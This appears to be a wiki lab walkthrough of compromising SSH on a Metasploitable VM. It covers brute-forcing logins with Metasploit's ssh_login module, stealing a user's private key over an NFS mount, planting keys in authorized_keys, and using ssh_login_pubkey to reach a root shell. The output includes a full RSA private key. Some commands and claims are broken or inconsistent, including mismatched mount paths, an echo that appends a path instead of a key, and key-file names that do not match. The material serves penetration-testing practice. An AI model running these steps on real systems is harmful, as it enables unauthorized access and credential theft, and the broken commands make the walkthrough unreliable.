
## SSH Service Info
https://www.offensive-security.com/metasploit-unleashed/scanner-ssh-auxiliary-modules/


First, a reminder of the information nmap returned about the SSH service after a port scan:

```
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
```
This server isn't using the 1.0 protocol, which is hopelessly broken and easy to defeat. This means getting past SSH will be (at least) mildly challenging.

## Metasploit SSH Exploits

Two SSH attacks using metasploit:
```
* ssh_login
* ssh_login_pubkey
```

###  Metasploit ssh_login

The first attack is ssh_login, which allows you to use metasploit to brute-force guess SSH login credentials.
* Module name is <code>auxiliary/scanner/ssh/ssh_login</code>

Link: https://www.offensive-security.com/metasploit-unleashed/scanner-ssh-auxiliary-modules/

###  Metasploit ssh_login_pubkey

The second attack requires a private key. If you do gain access to the private SSH keys on a victim machine, you can attempt to authenticate with a large number of hosts and services using that private key.
* Module name is <code>auxiliary/scanner/ssh/ssh_login_pubkey</code>

Link: https://www.offensive-security.com/metasploit-unleashed/scanner-ssh-auxiliary-modules/

## Brute Force ssh_login

We already covered how to brute force the login with Hydra, [[Metasploitable/SSH/Brute Force]]

Did you know you can also brute force an SSH login with Metasploitable? Use the <code>auxiliary/scanner/ssh/ssh_login</code> module.

### Setting Up the Attack==

We will use the module <code>auxiliary/scanner/ssh/ssh_login</code>:

```
msf > use auxiliary/scanner/ssh/ssh_login
```

Set this to run on the Metasploitable virtual box target:
```
msf auxiliary(ssh_login) > set RHOSTS 10.0.0.27
RHOSTS => 10.0.0.27
msf auxiliary(ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
USERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
msf auxiliary(ssh_login) > set VERBOSE false
VERBOSE => false
```

### Running the Attack

Now run the attack:

```
msf auxiliary(ssh_login) > run

[*] 10.0.0.27:22 - SSH - Starting buteforce
[*] Command shell session 1 opened (?? -> ??) at 2016-03-26 17:25:18 -0600
[+] 10.0.0.27:22 - SSH - Success: 'msfadmin':'msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Wed Apr 10 12:02:00 UTC 2014 i686 GNU/Linux '
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ssh_login) >
```

### Houston, We Have A Shell

At this point, we can create a session with the machine that we compromised. Logged in as user msfadmin:

```
msf auxiliary(ssh_login) > sessions -i 1
[*] Starting interaction with 1...

id
uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Wed Apr 10 12:02:00 UTC 2014 i686 GNU/Linux
```

## Private Key ssh_login_pubkey


If you manage to get your hands on the victim's private key, the <code>auxiliary/scanner/ssh/ssh_login_pubkey</code> module is for you!

This module uses the private key to do two things:
* Get access to the victim machine
* Get access to any machines that trust the victim's private key (must be listed in the SSH files of the victim machine)

## Obtaining Private Key

To carry out this attack, you will need to have access to the file system, and/or be able to mount the remote file system (which, on Metasploitable, happens to be possible!): see [[Metasploitable/NFS]]

Once you've got access to the file system, you'll grab a copy of the remote machine's private keys, and use them together with Metasploit to obtain access to the machine.

(Note that you could also plant your keys on the target, by adding your public SSH keys onto the target machine's list of trusted machines, but this technique would restrict you to a particular machine, wile the Metasploit method is portable and less intrusive.)

To snatch the target's private key:

```
# service rpcbind start
# mkdir /tmp/target
# mount -t nfs 10.0.0.27:/ /temp/target
# cp /tmp/target/home/msfadmin/.ssh/id_rsa /tmp/r00tprivatekey
# umount /tmp/target
```

Now you have a copy of the <code>msfadmin</code> account's private SSH key.

Metasploit We'll use Metasploit to turn this into access to the remote machine.

This key is also useful for impersonating the target when connecting to OTHER remote machines.

###  Planting Private Keys

An alternative method to gain access, although it is not useful for gaining access to any machines other than the victim machine, is to GENERATE a public/private SSH key pair from the attacker machine, and copy the PRIVATE key over to the remote machine. (Using the public key and the above-mentioned technique would be easier, but it's worth mentioning at least.)

To plant your private keys on the remote machine, you'll need write access to the target user's home directory. You'll generate a public SSH key from the attacker machine, the machine you want to have access WITH, and add it to the other machine's <code>~/.ssh/authorized_keys</code>.

This presumes the <code>.ssh</code> directory exists. If it doesn't exist, you can make it, and tamper with the filesystem.

```
# service rpcbind start
# mkdir /tmp/target
# mount -t nfs 10.0.0.27:/ /temp/target
# cd /tmp/target/home/msfadmin/ && mkdir .ssh/
# echo ~/.ssh/id_rsa >> /tmp/target/home/msfadmin/.ssh/authorized_keys
# umount /tmp/target
</pre>

==Setting Up the Attack==

Here's info on the <code>auxiliary/scanner/ssh/ssh_login_pubkey</code> module in Metasploit, which will carry out the attack:

```
msf > use auxiliary/scanner/ssh/ssh_login_pubkey
</pre>

Set some options, such as the private key file, the username to log in with, and the remote host:

```
msf auxiliary(ssh_login_pubkey) > set KEY_FILE /tmp/r00tprivatekey
KEY_FILE => /tmp/id_rsa
msf auxiliary(ssh_login_pubkey) > set USERNAME root
USERNAME => root
msf auxiliary(ssh_login_pubkey) > set RHOSTS 10.0.0.27
RHOSTS => 10.0.0.27
msf auxiliary(ssh_login_pubkey) >
```

### Running the Attack==

Execute the attack, to use the remote machine's private key to gain access to the remote machine:

```
msf auxiliary(ssh_login_pubkey) > run

[*] 10.0.0.27:22 SSH - Testing Cleartext Keys
[*] 10.0.0.27:22 SSH - Testing 1 keys from /root/r00tmsfkey
[+] 10.0.0.27:22 SSH - Success: 'root:-----BEGIN RSA PRIVATE KEY-----
MIIEoQIBAAKCAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqld
JkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qO
ffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5
JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9I
yhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7b
wkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3wIBIwKCAQBaUjR5bUXnHGA5fd8N
UqrUx0zeBQsKlv1bK5DVm1GSzLj4TU/S83B1NF5/1ihzofI7OAQvlCdUY2tHpGGa
zQ6ImSpUQ5i9+GgBUOaklRL/i9cHdFv7PSonW+SvF1UKY5EidEJRb/O6oFgB5q8G
JKrwu+HPNhvD+dliBnCn0JU+Op/1Af7XxAP814Rz0nZZwx+9KBWVdAAbBIQ5zpRO
eBBlLSGDsnsQN/lG7w8sHDqsSt2BCK8c9ct31n14TK6HgOx3EuSbisEmKKwhWV6/
ui/qWrrzurXA4Q73wO1cPtPg4sx2JBh3EMRm9tfyCCtB1gBi0N/2L7j9xuZGGY6h
JETbAoGBANI8HzRjytWBMvXh6TnMOa5S7GjoLjdA3HXhekyd9DHywrA1pby5nWP7
VNP+ORL/sSNl+jugkOVQYWGG1HZYHk+OQVo3qLiecBtp3GLsYGzANA/EDHmYMUSm
4v3WnhgYMXMDxZemTcGEyLwurPHumgy5nygSEuNDKUFfWO3mymIXAoGBAMqZi3YL
zDpL9Ydj6JhO51aoQVT91LpWMCgK5sREhAliWTWjlwrkroqyaWAUQYkLeyA8yUPZ
PufBmrO0FkNa+4825vg48dyq6CVobHHR/GcjAzXiengi6i/tzHbA0PEai0aUmvwY
OasZYEQI47geBvVD3v7D/gPDQNoXG/PWIPt5AoGBAMw6Z3S4tmkBKjCvkhrjpb9J
PW05UXeA1ilesVG+Ayk096PcV9vngvNpLdVAGi+2jtHuCQa5PEx5+DLav8Nriyi2
E5l35bqoiilCQ83PriCAMpL49iz6Pn00Z3o+My1ZVJudQ5qhjVznY+oBdM3DNpAE
xn6yeL+DEiI/XbPngsWvAoGAbfuU2a6iEQSp28iFlIKa10VlS2U493CdzJg0IWcF
2TVjoMaFMcyZQ/pzt9B7WQY7hodl8aHRsQKzERieXxQiKSxuwUN7+3K4iVXxuiGJ
BMndK+FYbRpEnaz591K6kYNwLaEg70BZ0ek0QjC2Ih7t1ZnfdFvEaHFPF05foaAg
iIMCgYAsNZut02SC6hwwaWh3Uxr07s6jB8HyrET0v1vOyOe3xSJ9YPt7c1Y20OQO
Fb3Yq4pdHm7AosAgtfC1eQi/xbXP73kloEmg39NZAfT3wg817FXiS2QGHXJ4/dmK
94Z9XOEDocClV7hr9H//hoO8fV/PHXh0oFQvw1d+29nf+sgWDg==
-----END RSA PRIVATE KEY-----
' 'uid=0(root) gid=0(root) groups=0(root) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[*] Command shell session 1 opened (10.0.0.5:33428 -> 10.0.0.27:22) at 2016-03-26 19:42:50 -0700
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ssh_login_pubkey) >
```
Success - we've got a session.

## Getting a Shell

Now we can use the <code>sessions</code> command to utilize the information we just found and set up an interactive session.

```
msf auxiliary(ssh_login_pubkey) > sessions -i 1
[*] Starting interaction with 1...

id
uid=0(root) gid=0(root) groups=0(root)

uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

whoami
root

pwd
/root
```</pre>```

We could create more mischief, by copying everyone else's private SSH keys and SSH connection histories, potentially giving us passwordless access to additional machines.

We could also get busy with post-exploit activities.

See https://www.offensive-security.com/metasploit-unleashed/scanner-ssh-auxiliary-modules/
